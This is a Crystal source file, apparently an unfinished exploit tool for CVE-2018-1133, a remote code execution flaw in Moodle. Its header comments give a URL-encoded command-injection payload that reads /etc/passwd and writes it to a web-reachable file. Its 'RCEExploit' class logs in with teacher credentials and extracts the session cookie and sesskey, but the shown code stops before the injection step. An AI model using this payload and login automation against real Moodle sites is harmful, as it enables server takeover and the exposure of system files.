# TODO: Write documentation for `Toodlemoodle`
# CVE-2018-1133 link: https://www.exploit-db.com/exploits/46551
# NVD vuln page: https://nvd.nist.gov/vuln/detail/CVE-2018-1133
# Security researcher page: https://blog.ripstech.com/2018/moodle-remote-code-execution/
# Docker image: https://hub.docker.com/r/jhardison/moodle/dockerfile
# Payload (date%3Bcat%20%2Fetc%2Fpasswd)%3E..%2Fhi.txt

require "http/client"
require "option_parser"
require "json"
require "base64"

module TMoodleActions
  class RCEExploit
    def perform(target)
      puts "Enter the teacher username."
      username = gets().not_nil!
      puts "Enter the teacher password."
      psw = gets().not_nil!
      login(target, username, psw)
    end

    def login(url, user, psw)
      data = {
        "anchor"   => "",
        "username" => user,
        "password" => psw,
      }
      redirect_response = http_post(url + "/login/index.php", data)

      if redirect_response.status_code == 303
        # extract the new moodle session ID
        moodle_session = /path=\/\", \"MoodleSession=(.*); path=\/\",/.match(redirect_response.headers.to_s).try &.[1]
        response = http_get(url + "/my/", moodle_session)
        if response.status_code == 303
          puts "FAIL"
        else
          session_key = /sesskey\":\"(.*)\",\"loadingicon/.match(response.body).try &.[1]
          puts moodle_session
          puts session_key
        end
      end
    end

    private def http_post(url, data : String | Hash(String, String | Int32), moodle_session = "", json = nil)
      headers = HTTP::Headers.new
      if moodle_session != ""
        headers.add("Cookie", "MoodleSession=" + moodle_session)
      end
      if json
        headers.add("Content-Type", "application/json")
      end

      return HTTP::Client.post(url, headers: headers, form: data)
    end

    private def http_get(url, moodle_session)
      headers = HTTP::Headers.new
      headers.add("Cookie", "MoodleSession=" + moodle_session.to_s)
      return HTTP::Client.get(url, headers: headers)
    end
  end
end
